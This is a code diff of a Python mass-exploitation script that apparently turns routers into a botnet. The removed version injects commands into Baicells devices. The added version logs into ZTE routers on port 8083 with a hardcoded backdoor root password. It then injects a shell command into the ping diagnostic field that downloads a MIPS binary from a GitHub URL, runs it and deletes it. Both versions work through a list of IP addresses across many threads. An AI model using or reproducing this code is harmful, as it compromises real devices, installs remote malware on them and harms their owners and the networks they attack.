@@ -1,33 +1,36 @@
-import requests
+#! python !#
+import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
 from threading import Thread
+from time import sleep
+import requests
+from requests.auth import HTTPDigestAuth
+from decimal import *	
+ips = open(sys.argv[1], "r").readlines()
 
-command = "wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2Fjdifjshfirej%2Frefs%2Fheads%2Fmain%2Farmv7%3Bchmod%20777%20armv7%3B.%2Farmv7"
-exec_msg = "$UICIDEBOY$"
+login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."
+command_payload = "&Host=;$(wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"
 
-port = "80"
+class rtek(threading.Thread):
+		def __init__ (self, ip):
+			threading.Thread.__init__(self)
+			self.ip = str(ip).rstrip('\n')
+		def run(self):
+			try:
+				print "[ZTE] Loading - " + self.ip
+				url = "http://" + self.ip + ":8083/login.gch"
+                                url2 = "http://" + self.ip + ":8083/manager_dev_ping_t.gch"
+				url3 = "http://" + self.ip + ":8083/getpage.gch?pid=1001&logout=1"
+                               
+				requests.post(url, timeout=3, data=login_payload) # bypass auth with backdoor
+				requests.post(url2, timeout=2.5, data=command_payload) # command injection in ping function
+                                requests.get(url3, timeout=2.5) # logout so we dont keep the session open (it happens and its annoying)
 
-def load_ips(file_path):
-    with open(file_path, 'r') as file:
-        return [line.strip() for line in file]
-
-def loader(file_path):
-    ip_list = load_ips(file_path)
-    for ip in ip_list:
-        Thread(target=main, args=(ip, )).start()
-
-def main(ip):
-    try:
-        headers = {"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"}
-        r = requests.get(f"http://{ip}:{port}", headers=headers)
-        if "Baicells Management Utility" in r.text:  
-            print("found -> " + ip)
-            req = requests.post(f"http://{ip}:{port}/utility/run_warn_command.sh", 
-                                data=f"commands=S||{command}&hash=browser_time%3D1608466780", 
-                                headers=headers)
-            
-            if exec_msg in req.text:
-                print(f"Success: {ip}")
-    except Exception as c:
-        pass
-
-loader('ips.txt')
+			except Exception as e:
+				pass
+for ip in ips:
+	try:
+		n = rtek(ip)
+		n.start()
+		time.sleep(0.03)
+	except:
+		pass
